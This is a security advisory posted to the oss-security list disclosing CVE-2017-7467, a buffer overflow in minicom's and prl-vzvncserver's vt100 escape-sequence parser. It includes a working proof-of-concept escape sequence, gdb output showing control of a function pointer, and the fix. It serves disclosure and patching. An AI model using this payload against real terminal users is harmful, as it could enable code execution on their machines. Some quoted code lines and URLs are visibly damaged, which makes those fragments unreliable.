{
    "text": "Date: Tue, 18 Apr 2017 15:22:55 +0200 ， From: Solar Designer <solar@.nwall.com> ， To: oss-security@.ts.openwall.com ， Cc: Adam Lackorzynski <adam@.inf.tu-dresden.de> ， Subject: CVE-2017-7467: minicom and prl-vzvncserver vt100.c escparms[] buffer overflow ， Hi, ， This is to announce a vulnerability that has just been fixed in minicom ， 2.7.1 released earlier today, and that had been found and fixed in ， derived code in prl-vzvncserver (a Virtuozzo 7 component) earlier this ， year. minicom 2.7.1 is available for download at: ， https:/alioth.debian.org/projects/minicom/ ， The main bug is that in minicom's vt100.c escparms[] is declared as: ， static void (*vt_keyb)(int, int);/* Gets called for NORMAL/APPL switch. */ ， static void (*termout)(const char *, int);/* Gets called to output a string. */ ， static int escparms[8]; /* Cumulated escape sequence. */ ， static int ptr; /* Index into escparms array. */ ， static long vt_tabs[5]; /* Tab stops for max. 32*5 = 160 columns. */ ， but is filled as: ， /* See if a number follows */ ， escparms[ptr] = 10*escparms[ptr] + c - '0'; ， } ， /* Separation between numbers ? */ ， ptr+; ， } ， Notice the 8 vs. 15 (meaning 16 elements) discrepancy. ， At least in the Fedora 23 package of minicom, this lets me adjust or ， replace the termout function pointer. If the variables were put in .bss ， in the other order (perhaps by a different compiler), then ptr could be ， overwritten, which is likely also exploitable. ， Here's how to reproduce: ， mkfifo fifo ， gdb /usr/bin/minicom ， (gdb) r -oD fifo ， Starting program: /usr/bin/minicom -oD fifo ， On another terminal: ， echo -ne \"\\033[0;0;0;0;0;0;0;0;00000000000000000000001094795585;00000000000000000000001094795585\" > fifo ， Then press Enter in minicom, and: ， Program received signal SIGSEGV, Segmentation fault. ， 0x000055555555d31f in v_termout () ， (gdb) disass ， Dump of assembler code for function v_termout: ， [.] ， 0x000055555555d316 <+70>:\tmov %r12d,%esi ， 0x000055555555d319 <+73>:\tmov %rbp,%rdi ， 0x000055555555d31c <+76>:\tpop %rbp ， 0x000055555555d31d <+77>:\tpop %r12 ， => 0x000055555555d31f <+79>:\tjmpq *0x225ebb(%rip) # 0x5555557831e0 ， 0x000055555555d325 <+85>:\tnopl (%rax) ， 0x000055555555d328 <+88>:\tmov $0xa,%edi ， 0x000055555555d32d <+93>:\tcallq 0x55555555be70 <vt_out> ， 0x000055555555d332 <+98>:\tjmp 0x55555555d304 <v_termout+52> ， End of assembler dump. ， (gdb) x/2x 0x5555557831e0 ， 0x5555557831e0:\t0x41414141\t0x41414141 ， As you can see, I am able to control the address to branch to. Moreover, ， on typical 64-bit little-endian there's partial ASLR (PIE) bypass due to ， ability to keep most significant 32 bits of the function pointer intact. ， Thus, this bug likely allows for remote code execution. ， In the PoC above, the decimal numbers (corresponding to the 32-bit ， pointer halves) include leading zeroes (for exactly 32 digits in each ， number) in order to completely shift out, one bit at a time, the ， previous contents of the v_termout pointer. This works due to the ， multiplier 10 including 2 as a factor. ， The fix included in minicom 2.7.1 is simply: ， -\tif (ptr < 15) ， +\tif (ptr < 7) ， (I guess a later code revision could introduce a macro for this array's ， size, or determine the array size by dividing two sizeof's.) ， I'd like to thank Adam Lackorzynski, CC'ed here, for producing the new ， minicom release promptly and in time for this announcement. ， I first found the bug during Openwall's security audit of the ， Virtuozzo 7 product, which contains derived downstream code in its ， prl-vzvncserver component. The corresponding Virtuozzo 7 fix is: ， https:/src.openvz.org/projects/OVZ/repos/prl-vzvncserver/commits/6d95404e75b98f36b1cc85ee23df99dcf06ca13f ， We would like to thank the Virtuozzo company for funding the effort. ， In prl-vzvncserver, the escparms[] overflow wasn't obviously exploitable ， due to different nearby variables: ， static int esc_s = 0;"
}